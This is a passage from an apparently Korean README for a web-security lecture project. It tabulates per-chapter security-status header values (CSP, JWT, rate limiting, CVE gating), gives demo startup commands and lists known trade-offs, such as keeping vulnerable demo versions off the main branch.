| 02b(pass) | `credentials=allowed,origin=explicit` | 3박자 충족 |
| 03(off) | `csp=off` | 인라인 스크립트 실행됨 |
| 03(on) | `csp=report-only,violations=N` | 위반만 기록 |
| 04 | `csp=enforced,nonce=on,strict-dynamic=on` | 화이트리스트 0 |
| 05(weak) | `jwt=weak-secret` | brute force 가능 |
| 05(strong) | `jwt=alg-locked,exp=300s,verified` | 위조 → 401 |
| 06 | `ratelimit=5/60s,id=uuid,fingerprint=stripped` | 4가지 차단 |
| 07 | `gate=approved,cve=0` | CI 통과 시그널 |

---

## 시연 순서

```bash
pnpm install

# BE: apps/lecture/src/app.module.ts에서 ChXXSecurityModule 토글
# FE: apps/web/src/active-chapter.ts에서 ACTIVE_CHAPTER 변경

pnpm start:dev   # BE :3000
pnpm start:web   # FE :5173
```

---

## 알려진 트레이드오프

- **`x-security-status`는 학습용 헤더** — prod에서 제거 (Ch06에 명시).
- **Ch07 CVE 시연**: 취약 버전은 별도 시연 브랜치에서만, main merge 금지.
- **Ch05 인증**: in-memory bcrypt — DB 없음. RDB는 OAS 시리즈 범위.
- **Nonce + Vite SPA**: SPA는 서버가 HTML을 동적으로 서빙하지 않아 nonce 주입이 복잡. NestJS가 `index.html`을 동적 서빙하거나 Vite SSR plugin 사용 — 구현 시점에 방법 결정.
